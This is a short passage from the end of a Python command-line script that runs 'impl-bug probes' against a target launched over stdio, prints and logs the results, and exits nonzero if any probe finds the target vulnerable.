        return 0 if _selftest() else 1
    import shlex
    results = asyncio.run(scan_target(shlex.split(args.target_stdio)))
    print(f"impl-bug probes vs {args.target_stdio!r}:")
    _print(results)
    print("log:", _write_log(args.target_stdio, results))
    return 1 if any(r.verdict == VULNERABLE for r in results) else 0


if __name__ == "__main__":
    sys.exit(main())
